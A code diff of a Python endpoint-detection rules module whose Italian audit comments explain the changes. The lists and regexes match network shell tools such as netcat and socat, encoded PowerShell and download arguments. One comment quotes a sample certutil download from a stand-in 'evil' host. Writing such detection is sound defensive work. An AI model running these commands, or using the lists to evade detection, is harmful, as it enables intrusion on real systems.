@@ -188,20 +188,23 @@ SCRIPT_INTERPRETERS = {
     "powershell_ise.exe", "powershell_ise",
 }
 
-# — Suspicious execution paths (expanded)
+# — Suspicious execution paths (expanded; audit: normalizzati a slash "/"
+# perche' i sensori possono inviare "C:/Temp/x.exe"; niente wildcard "*"
+# letterali e niente "~" non espanso: match per sottostringa semplice)
 SUSPICIOUS_PATHS = {
-    "\\temp\\", "\\tmp\\", "\\appdata\\local\\temp\\",
-    "\\downloads\\", "\\desktop\\", "\\cache\\",
-    "\\recycle.bin\\", "\\$recycle.bin\\",
-    "\\programdata\\", "\\appdata\\roaming\\",
-    "\\users\\public\\", "\\perflogs\\",
-    "\\windows\\temp\\", "\\wINDOWS\\Temp\\",
-    "\\system32\\tasks\\", "\\system32\\spool\\drivers\\",
-    "\\system32\\spool\\servic\\",
-    "/tmp/", "/var/tmp/", "/dev/shm/",  # nosec B108 - detection indicator, not a filesystem operation
+    "/temp/", "/tmp/", "/appdata/local/temp/",
+    "/downloads/", "/desktop/", "/cache/",
+    "/recycle.bin/", "/$recycle.bin/",
+    "/programdata/", "/appdata/roaming/",
+    "/users/public/", "/perflogs/",
+    "/windows/temp/",
+    "/system32/tasks/", "/system32/spool/drivers/",
+    "/system32/spool/servic/",
+    "/var/tmp/", "/dev/shm/",  # nosec B108 - detection indicator, not a filesystem operation
     "/var/cache/", "/var/spool/", "/var/www/",
-    "/home/*/.cache/", "/home/*/.local/share/Trash/",
+    "/.cache/", "/.local/share/trash/",
     "/run/user/", "/dev/pts/",
+    "library/launchagents/", "library/launchdaemons/",
 }
 
 # — Desktop apps that shouldn't run as root/system
@@ -217,7 +220,7 @@ NON_ROOT_PROCESSES = {
 # — Network tools (expanded)
 NETWORK_TOOLS = {
     "wireshark.exe", "wireshark", "tshark", "tcpdump",
-    "dumpcap", "tshark", "ethereal",
+    "dumpcap", "ethereal",
     "netstat", "arp.exe", "arp", "route.exe",
     "curl.exe", "curl", "wget", "wget.exe",
     "nc.exe", "ncat.exe", "ncat", "netcat", "socat",
@@ -320,24 +323,25 @@ MALWARE_FAMILIES = [
      "TA0006", "Credential Access", "T1003"),
 ]
 
-# — Persistence locations (for process_path matching)
+# — Persistence locations (for process_path matching; slash-normalized)
 PERSISTENCE_PATHS = {
-    "\\startup\\", "\\start menu\\programs\\startup\\",
-    "\\system32\\tasks\\", "\\system32\\drivers\\etc\\",
-    "\\windows\\system32\\tasks\\",
-    "\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\",
+    "/startup/", "/start menu/programs/startup/",
+    "/system32/tasks/", "/system32/drivers/etc/",
+    "/windows/system32/tasks/",
+    "/appdata/roaming/microsoft/windows/start menu/programs/startup/",
     "/etc/init.d/", "/etc/systemd/system/",
     "/etc/cron.d/", "/etc/cron.hourly/", "/etc/cron.daily/",
-    "/Library/LaunchAgents/", "/Library/LaunchDaemons/",
-    "~/Library/LaunchAgents/",
+    "/library/launchagents/", "/library/launchdaemons/",
+    "library/launchagents/",
 }
 
-# — Encoded command patterns (expanded)
+# — Encoded command patterns (expanded; audit: soglia {12,} non {20,}:
+# payload brevi reali ("-e SQBuAHYAbwBrAGEAAAA=") passavano inosservati)
 ENCODED_PATTERNS = [
-    r'-(enc|encodedcommand|e)\s+[A-Za-z0-9+/]{20,}={0,2}',
+    r'-(enc|encodedcommand|e)\s+[A-Za-z0-9+/]{12,}={0,2}',
     r'base64.+decode',
     r'frombase64string',
-    r'-e\s+[A-Za-z0-9+/]{20,}={0,2}',
+    r'-e\s+[A-Za-z0-9+/]{12,}={0,2}',
     r'iex\s*\(',
     r'invoke-expression',
     r'-ec\s+',
@@ -348,6 +352,50 @@ ENCODED_PATTERNS = [
 
 # — High thread count threshold (possible injection indicator)
 HIGH_THREAD_COUNT_THRESHOLD = 200
+
+# — LOLBin in standard path: scatta solo con argomenti di download/esecuzione.
+# (audit: certutil.exe legittimo in System32 non deve alertare da solo, ma
+# `certutil -urlcache -split -f http://evil/x` si'.)
+LOLBIN_SUSPICIOUS_ARGS = (
+    "-urlcache", "-split", "-f http", "http://", "https://",
+    "frombase64", "frombase64string", "invoke-expression", "iex(",
+    "-encodedcommand", "-enc ", "-e ", "-ec ", "downloadstring",
+    "webclient", "/transfer", "bitsadmin",
+)
+
+# — Standard system locations (slash-normalized): un LOLBin o un nome
+# simile-a-persistenza QUI da solo non basta per l'alert.
+_STANDARD_SYSTEM_PATHS = (
+    "/windows/system32/", "/windows/syswow64/", "/windows/",
+    "/usr/bin/", "/bin/", "/sbin/", "/usr/sbin/",
+    "/program files/", "/program files (x86)/",
+)
+
+
+def _norm_path(path: str | None) -> str:
+    """Path normalizzato per il matching: backslash->slash + lowercase."""
+    return (path or "").replace("\\", "/").lower()
+
+
+def _in_standard_path(path: str | None) -> bool:
+    return any(p in _norm_path(path) for p in _STANDARD_SYSTEM_PATHS)
+
+
+def _lev(a: str, b: str) -> int:
+    """Distanza di Levenshtein (stringhe corte: nomi processo)."""
+    if a == b:
+        return 0
+    la, lb = len(a), len(b)
+    if abs(la - lb) > 1:
+        return 2
+    prev = list(range(lb + 1))
+    for i in range(1, la + 1):
+        cur = [i] + [0] * lb
+        for j in range(1, lb + 1):
+            cur[j] = min(prev[j] + 1, cur[j - 1] + 1,
+                         prev[j - 1] + (a[i - 1] != b[j - 1]))
+        prev = cur
+    return prev[lb]
 
 
 # ═══════════════════════════════════════════════════════════════════
@@ -360,21 +408,34 @@ def rule_known_attack_tool(event: EventSchema) -> RuleResult:
     name = event.process_name.lower().strip()
     name_noexe = name.replace(".exe", "").replace(".com", "").replace(".dll", "")
     combined = CREDENTIAL_TOOLS | SCANNER_TOOLS | EXPLOIT_TOOLS | POST_EXPLOIT_TOOLS | RAT_TOOLS | RANSOMWARE | EVASION_TOOLS | INFO_STEALERS
-    # Stem: "C:\Tools\mimikatz.exe" deve matchare, "mymimikatzlog.txt" no.
-    if name in combined or name_noexe in combined or _stem(name) in {_stem(x) for x in combined}:
+    combined_stems = {_stem(x) for x in combined}
+    # Audit: il rename aggirava il match sul solo process_name. Si matcha
+    # anche sul basename del path (binario rinominato) e sui token della
+    # command_line (tool invocato con altro nome).
+    candidates = {_stem(name), _stem(_base(event.process_path or ""))}
+    if name in combined or name_noexe in combined or candidates & combined_stems:
         return RuleResult(
             triggered=True, severity="CRITICAL",
             description=f"Known attack tool / malware detected: '{event.process_name}'.",
             mitre_tactic_id="TA0002", mitre_tactic="Execution", mitre_technique="User Execution",
             mitre_technique_id="T1204"
         )
+    if event.command_line:
+        tokens = set(re.findall(r"[a-z0-9][a-z0-9_.\-]*", event.command_line.lower()))
+        if tokens & {t.lower() for t in combined}:
+            return RuleResult(
+                triggered=True, severity="CRITICAL",
+                description=f"Known attack tool invoked via command line: '{event.process_name}'.",
+                mitre_tactic_id="TA0002", mitre_tactic="Execution", mitre_technique="User Execution",
+                mitre_technique_id="T1204"
+            )
     return RuleResult(triggered=False)
 
 
 def rule_suspicious_execution_path(event: EventSchema) -> RuleResult:
     if not event.process_path:
         return RuleResult(triggered=False)
-    path_lower = event.process_path.lower()
+    path_lower = _norm_path(event.process_path)
     for suspicious in SUSPICIOUS_PATHS:
         if suspicious in path_lower:
             return RuleResult(
@@ -432,11 +493,13 @@ def rule_double_extension(event: EventSchema) -> RuleResult:
 
 
 def rule_encoded_command(event: EventSchema) -> RuleResult:
-    if not event.process_path:
+    # Audit: il payload encoded vive in command_line, non in process_path.
+    # Si cerca in entrambi (path per retro-compatibilita' con vecchi sensori).
+    hay = ((event.command_line or "") + " " + (event.process_path or "")).lower()
+    if not hay.strip():
         return RuleResult(triggered=False)
-    path_lower = event.process_path.lower()
     for pattern in ENCODED_PATTERNS:
-        if re.search(pattern, path_lower):
+        if re.search(pattern, hay):
             return RuleResult(
                 triggered=True, severity="HIGH",
                 description=f"Encoded/obfuscated command detected in '{event.process_name}': possible payload.",
@@ -449,11 +512,13 @@ def rule_encoded_command(event: EventSchema) -> RuleResult:
 def rule_network_tool(event: EventSchema) -> RuleResult:
     if not event.process_name:
         return RuleResult(triggered=False)
-    name = event.process_name.lower().strip()
-    if name not in NETWORK_TOOLS:
+    # Audit: confronto sullo stem (senza estensione): "masscan.exe" deve
+    # matchare come "masscan", altrimenti la regola perde meta' dei casi.
+    name = _stem(event.process_name.lower().strip())
+    if name not in {_stem(t) for t in NETWORK_TOOLS}:
         return RuleResult(triggered=False)
     if event.process_path:
-        path_lower = event.process_path.lower()
+        path_lower = _norm_path(event.process_path)
         for suspicious in SUSPICIOUS_PATHS:
             if suspicious in path_lower:
                 return RuleResult(
@@ -506,12 +571,18 @@ def rule_malware_family(event: EventSchema) -> RuleResult:
     name_stripped = name.replace(".exe", "").replace(".dll", "").replace(".bat", "").replace(".ps1", "")
 
     for keyword, sev, desc, ta_tactic, tech, tech_id in MALWARE_FAMILIES:
-        if keyword in name or keyword in name_stripped:
+        # Audit: match solo a inizio token (niente FP tipo uploader/loader,
+        # bitcoin/coin, examiner/miner). " inject" -> "inject" (spazio morto).
+        # Audit MITRE: tactic_id = codice invariato (niente "Tactic 0002").
+        kw = keyword.strip()
+        if re.search(r"(?<![a-z0-9])" + re.escape(kw), name) or \
+           re.search(r"(?<![a-z0-9])" + re.escape(kw), name_stripped):
+            # La tupla e' (keyword, sev, desc, tactic_id, tactic_name, technique_id).
             return RuleResult(
                 triggered=True, severity=sev,
                 description=desc.format(name=event.process_name),
-                mitre_tactic_id=ta_tactic, mitre_tactic=ta_tactic.replace("TA", "Tactic "),
-                mitre_technique=tech, mitre_technique_id=tech_id,
+                mitre_tactic_id=ta_tactic, mitre_tactic=tech,
+                mitre_technique_id=tech_id,
             )
     return RuleResult(triggered=False)
 
@@ -519,7 +590,7 @@ def rule_malware_family(event: EventSchema) -> RuleResult:
 def rule_persistence_path(event: EventSchema) -> RuleResult:
     if not event.process_path:
         return RuleResult(triggered=False)
-    path_lower = event.process_path.lower()
+    path_lower = _norm_path(event.process_path)
     for p_path in PERSISTENCE_PATHS:
         if p_path in path_lower:
             return RuleResult(
@@ -531,21 +602,38 @@ def rule_persistence_path(event: EventSchema) -> RuleResult:
     return RuleResult(triggered=False)
 
 
+def _family_match(name: str) -> bool:
+    """True se il nome contiene una keyword malware a inizio token
+    (stessa semantica di rule_malware_family, riusabile)."""
+    for keyword, *_ in MALWARE_FAMILIES:
+        kw = keyword.strip()
+        if re.search(r"(?<![a-z0-9])" + re.escape(kw), name):
+            return True
+    return False
+
+
 def rule_dll_hijack_path(event: EventSchema) -> RuleResult:
-    if not event.process_path:
-        return RuleResult(triggered=False)
-    # DLL loaded from temp or user-writable path
-    path_lower = event.process_path.lower()
-    if not path_lower.endswith(".dll"):
-        return RuleResult(triggered=False)
-    for susp in SUSPICIOUS_PATHS:
-        if susp in path_lower:
+    def _susp_dll(path: str | None) -> bool:
+        pl = _norm_path(path)
+        return pl.endswith(".dll") and any(s in pl for s in SUSPICIOUS_PATHS)
+
+    # Via primaria (audit): moduli caricati dal sensore.
+    for mod in event.loaded_modules or []:
+        if _susp_dll(mod):
             return RuleResult(
                 triggered=True, severity="HIGH",
-                description=f"Possible DLL hijacking: '{event.process_name}' loaded from suspicious path.",
+                description=f"Possible DLL hijacking: '{mod}' loaded from suspicious path.",
                 mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="DLL Side-Loading",
                 mitre_technique_id="T1574"
             )
+    # Via legacy: processo .dll in esecuzione da path sospetto.
+    if event.process_path and _susp_dll(event.process_path):
+        return RuleResult(
+            triggered=True, severity="HIGH",
+            description=f"Possible DLL hijacking: '{event.process_name}' loaded from suspicious path.",
+            mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="DLL Side-Loading",
+            mitre_technique_id="T1574"
+        )
     return RuleResult(triggered=False)
 
 
@@ -553,16 +641,33 @@ def rule_lolbin_usage(event: EventSchema) -> RuleResult:
     if not event.process_name:
         return RuleResult(triggered=False)
     name = event.process_name.lower().strip()
-    if name in LOLBINS and event.process_path:
-        path_lower = event.process_path.lower()
-        # LOLBin in non-standard path
-        if "\\system32\\" not in path_lower and "\\syswow64\\" not in path_lower and "/usr/bin/" not in path_lower and "/bin/" not in path_lower:
-            return RuleResult(
-                triggered=True, severity="HIGH",
-                description=f"LOLBin '{event.process_name}' executed from non-standard path: '{event.process_path}'.",
-                mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="Signed Binary Proxy Execution",
-                mitre_technique_id="T1218"
-            )
+    if name not in LOLBINS or not event.process_path:
+        return RuleResult(triggered=False)
+    path_lower = _norm_path(event.process_path)
+    # Standard: dir di sistema Windows ovunque nel path; dir Unix solo a radice
+    # ("mingw64/bin" o "/home/x/bin" NON sono standard: devono alertare).
+    is_standard = (
+        "/system32/" in path_lower or "/syswow64/" in path_lower
+        or path_lower.startswith(("/usr/bin/", "/bin/", "/sbin/", "/usr/sbin/"))
+    )
+    # LOLBin in non-standard path
+    if not is_standard:
+        return RuleResult(
+            triggered=True, severity="HIGH",
+            description=f"LOLBin '{event.process_name}' executed from non-standard path: '{event.process_path}'.",
+            mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="Signed Binary Proxy Execution",
+            mitre_technique_id="T1218"
+        )
+    # Audit: LOLBin in path standard MA con argomenti di download/esecuzione:
+    # il caso classico (certutil -urlcache -f http://...) non deve passare.
+    cmd = (event.command_line or "").lower()
+    if any(a in cmd for a in LOLBIN_SUSPICIOUS_ARGS):
+        return RuleResult(
+            triggered=True, severity="HIGH",
+            description=f"LOLBin '{event.process_name}' with suspicious arguments: '{event.command_line}'.",
+            mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="Signed Binary Proxy Execution",
+            mitre_technique_id="T1218"
+        )
     return RuleResult(triggered=False)
 
 
@@ -593,29 +698,38 @@ def rule_network_beacon(event: EventSchema) -> RuleResult:
     if not event.network_connections:
         return RuleResult(triggered=False)
     name = _base(event.process_name or "")
+    # Audit: confronto su stem (i set mescolano "anydesk" e "nmap.exe":
+    # "anydesk.exe" non matchava mai). Set completi (mancavano RAT/ransomware).
+    stem = _stem(name)
     high_risk = (
-        name in LOLBINS
-        or name in CREDENTIAL_TOOLS
-        or name in SCANNER_TOOLS
-        or name in EXPLOIT_TOOLS
-        or name in POST_EXPLOIT_TOOLS
-        or any(k in name for k, *_ in MALWARE_FAMILIES)
+        name in LOLBINS or stem in {_stem(t) for t in LOLBINS}
+        or stem in {_stem(t) for t in CREDENTIAL_TOOLS}
+        or stem in {_stem(t) for t in SCANNER_TOOLS}
+        or stem in {_stem(t) for t in EXPLOIT_TOOLS}
+        or stem in {_stem(t) for t in POST_EXPLOIT_TOOLS}
+        or stem in {_stem(t) for t in RAT_TOOLS}
+        or stem in {_stem(t) for t in RANSOMWARE}
+        or stem in {_stem(t) for t in INFO_STEALERS}
+        or stem in {_stem(t) for t in EVASION_TOOLS}
+        or _family_match(stem)
     )
     if not high_risk:
         if not event.process_path:
             return RuleResult(triggered=False)
-        pl = event.process_path.lower()
+        pl = _norm_path(event.process_path)
         if not any(s in pl for s in SUSPICIOUS_PATHS):
             return RuleResult(triggered=False)
     outbound = []
     for conn in event.network_connections:
-        remote = conn.get("remote", "")
-        state = conn.get("state", "")
-        if ":" in remote and state == "ESTABLISHED":
-            host, port = remote.rsplit(":", 1)
-            # Check for public IP (not private ranges)
-            if host and not _is_private_ip(host):
-                outbound.append(remote)
+        remote = (conn.get("remote", "") or "").strip().strip("[]")
+        state = (conn.get("state", "") or "").upper()
+        if ":" not in remote or state != "ESTABLISHED":
+            continue
+        host, port = remote.rsplit(":", 1)
+        host = host.strip().strip("[]")
+        # Check for public IP (not private ranges)
+        if host and not _is_private_ip(host):
+            outbound.append(remote)
     if outbound:
         remote_str = "; ".join(outbound[:3])
         return RuleResult(
@@ -645,6 +759,19 @@ def rule_persistence_autorun(event: EventSchema) -> RuleResult:
             mitre_tactic_id="TA0003", mitre_tactic="Persistence", mitre_technique="Boot or Logon Autostart Execution",
             mitre_technique_id="T1547"
         )
+    # Audit: varianti a 1 carattere (svch0sts.exe) aggiravano il set esatto.
+    # Scatta solo fuori dai path di sistema: il vero svchost.exe di System32
+    # (distanza 1 da svch0st) non deve mai alertare.
+    stem = _stem(name)
+    if not _in_standard_path(event.process_path):
+        for bad in {_stem(b) for b in persistence_names} | {"svchost", "scvhosts"}:
+            if _lev(stem, bad) <= 1:
+                return RuleResult(
+                    triggered=True, severity="HIGH",
+                    description=f"Suspicious persistence-like process name (variant of '{bad}'): '{event.process_name}'.",
+                    mitre_tactic_id="TA0003", mitre_tactic="Persistence", mitre_technique="Boot or Logon Autostart Execution",
+                    mitre_technique_id="T1547"
+                )
     return RuleResult(triggered=False)
 
 
@@ -652,10 +779,19 @@ def rule_persistence_autorun(event: EventSchema) -> RuleResult:
 #  HELPERS
 # ═══════════════════════════════════════════════════════════════════
 
-_PRIVATE_RANGES = re.compile(r'^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|169\.254\.|0\.)')
+_PRIVATE_V4 = re.compile(r'^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|169\.254\.|0\.|100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.)')
+_PRIVATE_V6 = re.compile(r'^(::1$|::ffff:|fe80:|fc00:|fd[0-9a-f]{2}:|fec0:)', re.IGNORECASE)
+
 
 def _is_private_ip(ip: str) -> bool:
-    return bool(_PRIVATE_RANGES.match(ip))
+    """IPv4 (incl. CGNAT 100.64/10) + IPv6 (loopback, link-local, ULA).
+    Unica implementazione condivisa (audit: ce n'erano due divergenti)."""
+    s = (ip or "").strip().strip("[]").split("%")[0]
+    if not s:
+        return True
+    if ":" in s:
+        return bool(_PRIVATE_V6.match(s))
+    return bool(_PRIVATE_V4.match(s))
 
 # ═══════════════════════════════════════════════════════════════════
 #  STATIC RULES REGISTRY
@@ -674,8 +810,8 @@ STATIC_RULES = [
                mitre_technique_id="T1204", fn=rule_suspicious_parent_child),
     StaticRule(rule_id="AEGIS-S003", version="1.0", confidence="high",
                name="Malware Family", severity="HIGH",
-               description="Process names matching known malware family patterns (trojan, backdoor, miner, ransomware, etc.).",
-               mitre_tactic_id="TA0002", mitre_tactic="Execution", mitre_technique="User Execution",
+               description="Process names matching known malware family patterns (trojan, backdoor, miner, ransomware, etc.). MITRE varies per matched family at runtime (see alert fields).",
+               mitre_tactic_id="TA0002", mitre_tactic="Execution", mitre_technique="Varies by family",
                mitre_technique_id="T1204", fn=rule_malware_family),
     StaticRule(rule_id="AEGIS-S004", version="1.0", confidence="medium",
                name="Suspicious Execution Path", severity="HIGH",
